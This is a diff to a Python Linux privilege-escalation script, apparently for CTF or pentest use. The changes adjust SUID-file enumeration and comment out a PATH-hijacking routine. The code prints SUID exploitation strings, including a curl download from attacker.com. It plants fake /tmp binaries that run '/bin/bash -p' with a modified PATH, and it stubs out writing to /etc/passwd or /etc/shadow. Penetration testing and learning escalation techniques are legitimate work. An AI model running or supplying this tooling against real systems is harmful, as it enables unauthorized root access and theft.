@@ -335,7 +335,7 @@ def sudo_l():
 def suid():
    print("\n### finding SUID files... ###")
    os.system("echo '### suid file search results ###' > /tmp/suid.txt")
-   os.system("echo ' ' >> /tmp/sudo_l.txt")
+   os.system("echo ' ' >> /tmp/suid.txt")
 
    suid_bins_print = {
    "curl":"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE",
@@ -380,8 +380,6 @@ def suid():
       suid = suid_file.readlines()
 
       for line in suid:
-         susplit = suid.split("/")
-         subin = susplit[-1]
          if ".sh" in line:
             print(line)
             os.system("echo '### {} is a suid binary and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(line))
@@ -389,14 +387,14 @@ def suid():
             continue
 
          for key in suid_bins_print:
-            if key == subin:
+            if key in line:
                print("\n{}: {}".format(key,suid_bins_print[key]))
                os.system("echo '### {}:{} is a suid file and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(key.strip(),suid_bins_print[key].strip()))
             else:
                continue
 
          for key in suid_bins_exec:
-            if key == subin:
+            if key in line:
                print("\n{}: {}".format(key,suid_bins_exec[key]))
                os.system("echo '### {} is a suid file and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(key.strip()))
                suid_cmd = value.strip()
@@ -408,8 +406,8 @@ def suid():
 
 # try SUID executables for $PATH exploitation
 def path():
-   print("\n### running strings on SUID executables & searching for cmds w/o fill path (might want to check manually as well)")
-   
+   print("\n### running strings on SUID executables & searching for cmds w/o full path (might want to check manually as well)")
+'''   
    common_cmds = ["base64", "bash", "chmod", "cp", "dig", "docker", "env", "file", "find", "gzip", "mosquitto", "mv", 
    "nmap", "openvpn", "perl", "php", "python", "mysql", "rsync", "strings", "systemctl", "unzip", "vim", "wc", "wget", 
    "zsh", "ls", "ftp", "apache2", "apache", "ssh", "ps", "ss", "cat", "touch", "mkdir", "cd", "rm", "nc", "service", 
@@ -432,13 +430,13 @@ def path():
                for cmd in common_cmds:
                   non_path_cmd = re.search("\s{}\s".format(cmd), str(item))
                   if non_path_cmd:
-                     #print("### {} does not specify full path of {} ###".format(line,cmd))
+                     print("### {} does not specify full path of {} ###".format(line,cmd))
                      os.system("echo '### {} does not specify full path of {} ###' >> /tmp/path_res.txt".format(line,cmd))
                      os.system("touch /tmp/{}&&echo '#!/bin/bash' > /tmp/{}&&echo '/bin/bash -p' >> /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
                      break
                   else:
                      continue
-
+'''
 
 # try writing to /etc/passwd or /etc/shadow
 def pass_shadow(username,password):
